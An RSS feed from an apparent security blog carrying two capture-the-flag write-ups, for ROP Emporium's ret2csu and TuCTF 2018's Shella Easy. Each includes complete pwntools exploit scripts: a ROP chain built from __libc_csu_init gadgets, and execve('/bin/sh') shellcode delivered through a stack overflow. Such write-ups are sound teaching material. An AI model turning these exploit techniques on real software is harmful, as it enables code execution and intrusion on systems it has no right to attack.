<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Thu, 12 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>ROP Emporium :: RET2CSU</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
</code></pre><p>We can also run <code>checksec</code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&rsquo;t execute shellcode.</p>
<pre><code>$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Running the executable shows us that it at some point takes user input. This is likely where we&rsquo;ll be able to find some vulnerability.</p>
<pre><code>$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

&gt; hello
Thank you!
</code></pre><p>After a tiny bit of reverse engineering, we see this <code>pwnme</code> function called by <code>main</code>. We can see that it allocates 0x20 bytes of memory for a buffer <code>buf</code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.</p>
<pre><code>void pwnme(void)
{
    void *buf;
    
    setvbuf(*_reloc.stdout, 0, 2, 0);
    puts(0xc88);
    puts(0xca0);
    memset(&amp;buf, 0, 0x20);
    puts(0xca8);
    printf(0xd12);
    read(0, &amp;buf, 0x200);
    puts(0xd15);
    return;
}
</code></pre><p>Further investigation reveals that there is a function called <code>ret2win</code>. Another function <code>usefulFunction</code> appears to call <code>ret2win</code> with the parameters <code>ret2win(0x3, 0x2, 0x1)</code>. We&rsquo;ll want to investigate this function further.</p>
<pre><code>0x00400510    1 6            sym.imp.ret2win
</code></pre><pre><code>0x000000000040061b &lt;+4&gt;:     mov    edx,0x3
0x0000000000400620 &lt;+9&gt;:     mov    esi,0x2
0x0000000000400625 &lt;+14&gt;:    mov    edi,0x1
0x000000000040062a &lt;+19&gt;:    call   0x400510 &lt;ret2win@plt&gt;
</code></pre><p>Reversing the <code>ret2win</code> function reveals that it will immediately call <code>exit</code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in <code>encrypted_flag.dat</code>.</p>
<p>The correct parameters are as follows:</p>
<ul>
<li><code>$rdi = 0xdeadbeefdeadbeef</code>.</li>
<li><code>$rsi = 0xcafebabecafebabe</code>.</li>
<li><code>$rdx = 0xd00df00dd00df00d</code>.</li>
</ul>
<p>So we have to find some way to set all of these registers to their correct values before calling the <code>ret2win</code> function in order to get the flag.</p>
<pre><code>      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  ┌─&lt; 0x000009fd      0f85d7000000   jne 0xada
  │   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  │   0x00000a0d      483945e0       cmp qword [var_20h], rax
 ┌──&lt; 0x00000a11      0f85c3000000   jne 0xada
 ││   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 ││   0x00000a21      483945d8       cmp qword [var_28h], rax
┌───&lt; 0x00000a25      0f85af000000   jne 0xada
│││   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
│││   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
│││   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

│││
└└└─&gt; 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
<p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *

r = process('./ret2csu')
gdb.attach(r)

r.clean()
r.writeline(cyclic(200))

r.interactive()
</code></pre><p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.</p>
<pre><code>pwndbg&gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
</code></pre><p>Using pwntools' <code>cyclic_find</code> function we can get the offset from the start of our input buffer to the return address stored on the stack.</p>
<pre><code>In [2]: cyclic_find(0x6161616161616166, n=8)
Out[2]: 40
</code></pre><p>Next let&rsquo;s figure out how we can store a value in the <code>$rdx</code> register. We&rsquo;re able to store values in the <code>$rdi</code> and <code>$rsi</code> registers quite easily (they have <code>pop; ret</code> gadgets we can easily use).</p>
<p>After digging around the <code>__libc_csu_init</code> function, we find two interesting looking gadgets, see below (I&rsquo;ve added some comments for clarity).</p>
<p>Note that we can use the first gadget to set the values of <code>$rsi</code> and <code>$rdx</code>.</p>
<pre><code>0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
</code></pre><pre><code>0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
</code></pre><p>It&rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.</p>
<p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).</p>
<p>Note the <code>call qword [r12 + rbx*8]</code> instruction. As it dereferences a pointer to a function, we can&rsquo;t use this to redirect execution.</p>
<pre><code>0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
</code></pre><p>Instead we&rsquo;ll have to find a pointer to some function that doesn&rsquo;t change anything, as to not ruin the values stored in our target registers. We&rsquo;ll just pass by this call and head to the <code>ret</code> instruction below.</p>
<p>Let&rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre><p>Using <code>objdump</code> and <code>grep</code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.</p>
<p>The address that immediately jumps out to me is <code>0x4003af</code>, which contains the bytes for the <code>_fini</code> function, a suitably inert function.</p>
<pre><code>$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
</code></pre><p>We can look this up in GDB to be sure (adding 1 to align the address correctly).</p>
<pre><code>pwndbg&gt; x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
</code></pre><p>Now we can use the <code>ropper</code> tool to find a gadget to set the value of <code>$rdi</code>. Surprise, surprise, we immediately find one.</p>
<pre><code>$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
<ul>
<li>Overwrite the return address in the <code>pwnme</code> function.</li>
<li>Store the values <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> in the <code>$rsi</code> and <code>$rdx</code> registers.</li>
<li>Store the value <code>0xdeadbeefdeadbeef</code> in the <code>$rdi</code> register.</li>
<li>Call the <code>ret2win</code> function with the above values.</li>
</ul>
<p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values <code>$rbp = 1</code> and <code>$rbx = 0</code>.</p>
<p>We also have to pad out the stack so that the <code>pop</code> instructions after the call don&rsquo;t destroy our rop chain.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


'''
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; 0x4003af+1
pop r13
pop r14     ; 0xcafebabecafebabe
pop r15     ; 0xd00df00dd00df00d
ret         ; ret2csu_rdx
'''
ret2csu_set = 0x00400680

'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword [r12 + rbx*8]
'''
ret2csu_rdx = 0x0040069a

'''
pop rdi     ; 0xdeadbeefdeadbeef
ret         ; ret2win
'''
pop_rdi = 0x004006a3

'''
jmp qword [reloc.ret2win]
'''
ret2win = 0x00400510 


elf = ELF('./ret2csu')
rop = ROP(elf)

# ret2csu_set
rop.raw(ret2csu_rdx)
rop.raw(0)                  # pop rbx
rop.raw(1)                  # pop rbp
rop.raw(0x4003af+1)         # pop r12
rop.raw(0)                  # pop r13
rop.raw(0xcafebabecafebabe) # pop r14
rop.raw(0xd00df00dd00df00d) # pop r15

# ret2csu_rdx
rop.raw(ret2csu_set)

# pop_rdi
rop.raw(0)                  # stack alignment
rop.raw(0)                  # pop rbx
rop.raw(0)                  # pop rbp
rop.raw(0)                  # pop r12
rop.raw(0)                  # pop r13
rop.raw(0)                  # pop r14
rop.raw(0)                  # pop r15
rop.raw(pop_rdi)
rop.raw(0xdeadbeefdeadbeef) # pop rdi

# ret2win
rop.raw(ret2win)

r = process('./ret2csu')

r.clean()
r.writeline(b'A'*40 + rop.chain())

r.readline()
log.success('Flag: ' + r.readline().decode('utf-8'))
</code></pre><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
</code></pre>]]></content></item><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>From the <code>file</code> command we can see that it is a dynamically linked linux executable.</p>
<pre><code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
</code></pre><p>Running <code>checksec</code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</p>
<pre><code>$ checksec ./shella-easy
[*] './shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>This means a few things for us:</p>
<ul>
<li>We know where everything is stored inside the binary.</li>
<li>We can execute arbitrary shellcode on the stack.</li>
<li>A stack overflow can give us control over program execution.</li>
</ul>
<p>Running <code>shella-easy</code> shows that the binary (at some point) takes user input. We&rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.</p>
<pre><code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
</code></pre><p>Reversing the <code>main</code> function of the binary reveals that it uses <code>gets</code> to take user input. As we suspected, this is likely where we can exploit this.</p>
<pre><code>0x08048532      83c408         add esp, 8
0x08048535      8d45b8         lea eax, [s]
0x08048538      50             push eax                    ; char *s
0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
</code></pre><p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable <code>var_8h</code> is not set to <code>0xdeadbeef</code>, the binary will immediately exit (instead of returning and giving us control).</p>
<pre><code>    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
┌─&lt; 0x08048548      7407           je 0x8048551
│   0x0804854a      6a00           push 0                      ; int status
│   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
└─&gt; 0x08048551      b800000000     mov eax, 0
    0x08048556      8b5dfc         mov ebx, dword [var_4h]
    0x08048559      c9             leave
    0x0804855a      c3             ret
</code></pre><p>We can also see that this variable <code>var_8h</code> is initially set to a value of <code>0xcafebabe</code> higher up in the instruction stream.</p>
<pre><code>0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
</code></pre><p>We&rsquo;ll want to find out where <code>var_8h</code> is stored relative to where our input <code>s</code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).</p>
<p>Radare tells us a little about where these variables are supposed to be stored (in the <code>main</code> function header), but we&rsquo;ll want to verify this later.</p>
<pre><code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
</code></pre><p>We can see that the <code>var_8h</code> is stored below our input buffer <code>s</code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.</p>
<p>A quick calculation <code>0x48 - 0x8 = 0x40 = 64</code> tells us that <code>var_8h</code> is stored 64 bytes after the start of our input buffer.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s spin up GDB and verify the location of <code>var_8h</code> relative to our input buffer <code>s</code>.</p>
<p>We&rsquo;ll set a breakpoint just after the <code>gets</code> call so we can see what the stack looks like just after we&rsquo;ve provided the binary with input.</p>
<pre><code>pwndbg&gt; disassemble main
Dump of assembler code for function main:

...

   0x08048539 &lt;+94&gt;:    call   0x8048390 &lt;gets@plt&gt;
   0x0804853e &lt;+99&gt;:    add    esp,0x4
   0x08048541 &lt;+102&gt;:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 &lt;+109&gt;:   je     0x8048551 &lt;main+118&gt;
   0x0804854a &lt;+111&gt;:   push   0x0
   0x0804854c &lt;+113&gt;:   call   0x80483a0 &lt;exit@plt&gt;
   0x08048551 &lt;+118&gt;:   mov    eax,0x0
   0x08048556 &lt;+123&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 &lt;+126&gt;:   leave  
   0x0804855a &lt;+127&gt;:   ret    

...

pwndbg&gt; b *0x0804853e
Breakpoint 1 at 0x804853e
</code></pre><p>We can now run the binary inside GDB and we&rsquo;ll give it the value <code>AAAA</code> when it prompts us for input, so we can easily see where our input is stored inside the stack.</p>
<pre><code>pwndbg&gt; r
Starting program: ./shella-easy 
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA

Breakpoint 1, 0x0804853e in main ()

...
</code></pre><p>After dumping the relevant part of the stack, we can verify the location of <code>var_8h</code> relative to <code>s</code> with a simple calculation; <code>0xffffd030 - 0xffffcff0 = 64</code>.</p>
<pre><code>pwndbg&gt; x/20x $ebp-0x48
0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
</code></pre><p>While we&rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.</p>
<pre><code>pwndbg&gt; x/x 0xffffcff0
0xffffcff0:     0x41414141
</code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
<p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *


pad = b'A'*64
var = p32(0xdeadbeef)

r = process('./shella-easy')
gdb.debug(r)

r.writeline(pad + var + cyclic(64))
r.interactive()
</code></pre><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x61616163
</code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
<pre><code>In [2]: cyclic_find(0x61616163)
Out[2]: 8
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
<p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    mov ecx, 0
    mov edx, 0
    mov eax, 11
    int 0x80            # execve(&quot;/bin/sh&quot;, 0, 0)
exit:
    mov ebx, 0          # exit code
    mov eax, 0
    int 0x80            # exit(0)
</code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
<pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><pre><code>In [1]: open('payload','rb').read()
Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
</code></pre><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
<ul>
<li>Capture the leaked stack address.</li>
<li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
<li>Overwrite the return address using the leak.</li>
<li>Get code execution.</li>
</ul>
<pre><code>#!/usr/bin/env python3

from pwn import *


buf = b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'

pad = b'A'*(64 - len(buf))
var = p32(0xdeadbeef)
off = b'A'*8

r = process('./shella-easy')
#gdb.attach(r)

# capture the leaked stack address
r.readuntil('Yeah I\'ll have a ')
leak = p32(eval(r.read(10)))
r.clean()

# send our payload to the binary
r.writeline(buf + pad + var + off + leak)
r.interactive()
</code></pre><p>And finally, here&rsquo;s the exploit in action.</p>
<pre><code>./exploit.py 
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
</code></pre>]]></content></item></channel></rss>